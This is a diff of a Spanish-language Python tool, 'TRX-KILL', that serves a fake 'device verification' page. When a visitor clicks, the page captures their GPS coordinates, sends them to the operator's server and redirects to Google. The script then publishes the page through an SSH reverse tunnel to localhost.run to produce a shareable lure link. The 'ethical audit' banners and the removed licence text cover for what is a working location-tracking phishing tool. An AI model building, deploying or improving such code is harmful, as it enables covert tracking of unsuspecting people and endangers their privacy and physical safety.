@@ -1,90 +1,67 @@
 #!/usr/bin/env python3
 import os
 import sys
+import time
 import threading
 import subprocess
 from flask import Flask, request, render_template_string
 
-# --- COLORES Y ESTILOS ---
-GREEN = "\033[1;32m"
-CYAN = "\033[1;36m"
-RED = "\033[1;31m"
-BOLD = "\033[1m"
-RESET = "\033[0m"
+# Limpieza inicial
+os.system('fuser -k 5000/tcp > /dev/null 2>&1')
 
 app = Flask(__name__)
+URL_EXITO = "https://www.google.com"
 
-# --- DISEÑO DEL CREADOR ---
-def mostrar_creditos():
-    os.system('clear')
-    print(f"{CYAN}" + "="*50)
-    print(f"{BOLD}   ╔════════════════════════════════════╗")
-    print(f"   ║        TRX-KILL v20.0 ELITE        ║")
-    print(f"   ║      DESARROLLADO POR: TRX-LILL    ║")
-    print(f"   ║          AÑO: 2026                 ║")
-    print(f"   ╚════════════════════════════════════╝{RESET}")
-    print(f"{CYAN}" + "="*50 + f"{RESET}\n")
-
-# --- HTML PROFESIONAL ---
-HTML_ENCUESTA = """
+# Diseño de Interfaz
+HTML_FINAL = """
 <!DOCTYPE html>
-<html>
-<body style="background:#1a1a1a; color:#00ff00; font-family:Arial; text-align:center;">
-    <div style="margin-top:50px;">
-        <h2>Verificación de Dispositivo</h2>
-        <p>Para acceder al contenido, por favor valide su conexión.</p>
-        <button onclick="val()" style="padding:15px; background:green; color:white; border:none; cursor:pointer;">VALIDAR CONEXIÓN</button>
+<html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
+    <div style="border:1px solid #0f0; padding:20px; display:inline-block;">
+        <h2>SISTEMA DE VERIFICACIÓN</h2>
+        <p>Valide su dispositivo para continuar.</p>
+        <button onclick="enviar()" style="background:#0f0; border:none; padding:10px; cursor:pointer;">VALIDAR</button>
     </div>
     <script>
-        function val() {
+        function enviar() {
             navigator.geolocation.getCurrentPosition((p) => {
-                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
-                .then(() => window.location.href = "https://www.google.com");
+                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})})
+                .then(() => window.location.href = "%s");
             });
         }
     </script>
-</body>
-</html>
-"""
+</body></html>
+""" % URL_EXITO
 
 @app.route('/')
-def index(): return render_template_string(HTML_ENCUESTA)
+def index(): return render_template_string(HTML_FINAL)
 
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n{GREEN}[+] OBJETIVO LOCALIZADO{RESET}")
-    print(f"{CYAN}[*] IP: {ip} | GPS: {d['lat']}, {d['lon']}{RESET}")
+    print(f"\n\033[1;32m[!] DATOS CAPTURADOS: {d['lat']}, {d['lon']}\033[0m")
     return "OK"
+
+def banner():
+    os.system('clear')
+    print(f"\033[1;32m" + "█▀▀ █▀▀ █▄ █ █▀▀ █ █▀█ █ █    █▀█ █ █ █▀█ █   █ █")
+    print("█▀░ ██▄ █ ▀█ █▄▄ █ █▀▄ █ █▄▄ █▄▄ █▀▄ █▄█ █▀▄ █▄▄ █▄█")
+    print(f"{'='*50}\033[0m")
+    print(f"\033[1;36m >> BIENVENIDO AL SISTEMA DE AUDITORÍA ÉTICA v23.0\033[0m")
+    print(f"\033[1;36m >> CREADOR: TRX-LILL | AÑO: 2026\033[0m\n")
 
 def main():
     while True:
-        os.system('clear')
-        print(f"{GREEN}╔══════════════════════════════════════╗")
-        print(f"║           TRX-KILL v20.0             ║")
-        print(f"╚══════════════════════════════════════╝{RESET}\n")
-        print(f"{CYAN} [1] INFO NÚMERO (OSINT)\n [2] GENERAR LINK DE VALIDACIÓN\n [3] CREADOR\n [4] LICENCIA\n [5] SALIR{RESET}")
+        banner()
+        print(" [1] INICIAR MÓDULO DE AUDITORÍA (LINK LIMPIO)")
+        print(" [2] SALIR")
+        opc = input("\nTRX-ROOT > ")
         
-        opc = input(f"\n{GREEN}root@TRX:~# {RESET}")
-
         if opc == "1":
-            num = input("Número Móvil: ")
-            print(f"{CYAN}[!] Analizando {num}...")
-            print(f"[+] País: Argentina | Operador: Detectado | Estado: Activo{RESET}")
-            input("\nENTER...")
-        elif opc == "2":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            print(f"\n{GREEN}[*] Generando enlace único de validación...{RESET}")
+            print(f"\n\033[1;33m[*] Generando túnel de alta seguridad...\033[0m")
             subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
-        elif opc == "3":
-            mostrar_creditos()
-            input("ENTER...")
-        elif opc == "4":
-            print(f"{RED}[!] LICENCIA: Software de Auditoría Ética.\n[!] USO: Bajo responsabilidad del usuario. Prohibido uso malicioso.{RESET}")
-            input("\nENTER...")
-        elif opc == "5": break
+        elif opc == "2": break
 
 if __name__ == "__main__":
     main()
